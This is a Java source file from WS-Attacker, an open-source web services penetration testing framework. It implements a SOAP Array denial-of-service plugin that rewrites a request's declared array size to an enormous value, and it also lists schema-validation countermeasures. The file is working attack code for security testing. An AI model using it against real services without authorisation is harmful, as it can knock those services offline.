/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;

import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class SoapArrayAttack
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;

    // </editor-fold>
    // Custom Attributes
    private AbstractOptionInteger optionNumberArrayElements;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        optionNumberArrayElements =
            new OptionLimitedInteger( "Number of SOAP array elements", 1000000000,
                                      "The number of SOAP array elements to be created", 1, 2000000000 );
        getPluginOptions().add( optionNumberArrayElements );

    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.NONE;
    }

    public void initData()
    {
        setName( "SOAP Array Attack" );
        setDescription( "This attack checks whether or not a Web service is vulnerable to the \"Soap Array\" attack. "
            + "In order for this attack to work the attacked Web service has to excpect a SOAP array.\n"
            + "Otherwise any SOAP array will be ignored and the attack won't work.\n"
            + "A detailed description of the attack can be found \n"
            + "at WS-Attacks.org: http://clawslab.nds.rub.de/wiki/index.php/Soap_Array_Attack" + "\n\n"
            + "The attack algorithm will automatically search for any SOAP array and will \n"
            + "change the array size to the value defined in parameter 8." + "\n\n" );
        setCountermeasures( "In order to counter the attack, strict schema validation has to be performed that limits the array size. "
            + "See http://clawslab.nds.rub.de/wiki/index.php/Soap_Array_Attack for more detailed countermeasures." );
    }

    @Override
    public boolean attackPrecheck()
    {
        // Try to find soapArray in SoapMessage
        String regex1 = "arrayType=\"[A-Za-z0-9:_-]*\\x5B";
        Pattern p1 = Pattern.compile( regex1 ); // Compiles regular expression
                                                // into Pattern.
        Matcher m1 = p1.matcher( this.getOriginalRequest().getRequestContent() ); // Creates
                                                                                  // Matcher
                                                                                  // with
                                                                                  // subject
                                                                                  // s
                                                                                  // and
                                                                                  // Pattern
                                                                                  // p.
        if ( m1.find() )
        {
            setAttackPrecheck( true );
            return true;
        }
        else
        {
            setAttackPrecheck( false );
            return false;
        }
    }

    @Override
    public void createTamperedRequest()
    {

        String stringSOAPMessage = this.getOptionTextAreaSoapMessage().getValue();

        // Try to find soapArray in SoapMessage
        String regex1 = "arrayType=\"[A-Za-z0-9:_-]*\\x5B";
        // Compiles regular expression into Pattern.
        Pattern p1 = Pattern.compile( regex1 );
        // Creates Matcher with subject s and Pattern p.
        Matcher m1 = p1.matcher( stringSOAPMessage );
        if ( m1.find() )
        {
            // get first part of Message
            int lengthFirstpart = m1.end();
            String firstPart = stringSOAPMessage.substring( 0, lengthFirstpart );

            // get last part of message and remove previous array length
            String lastPart = stringSOAPMessage.substring( lengthFirstpart, stringSOAPMessage.length() );
            ;
            String regex2 = "^[0-9]*\\x5D";
            Pattern p2 = Pattern.compile( regex2 );
            Matcher m2 = p2.matcher( lastPart );
            if ( m2.find() )
            {
                lastPart = m2.replaceFirst( "]" );
            }
            else
            {
                setAttackPrecheck( false );
            }

            // Build new Message via Stringbuilder - set Arraywidth to desired
            // number!
            StringBuilder sb = new StringBuilder();
            sb.append( firstPart );
            sb.append( optionNumberArrayElements.getValue() );
            sb.append( lastPart );

            // get HeaderFields from original request, if required add custom
            // headers - make sure to clone!
            Map<String, String> httpHeaderMap = new HashMap<String, String>();
            for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
            {
                httpHeaderMap.put( entry.getKey(), entry.getValue() );
            }

            // write payload and header to TamperedRequestObject
            this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), sb.toString() );
        }
        else
        {
            // get HeaderFields from original request, if required add custom
            // headers
            // write payload and header to TamperedRequestObject
            Map<String, String> httpHeaderMap = getOriginalRequestHeaderFields();
            this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), stringSOAPMessage );
            // Nothing found, attack will end right here!
            setAttackPrecheck( false );
        }
    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
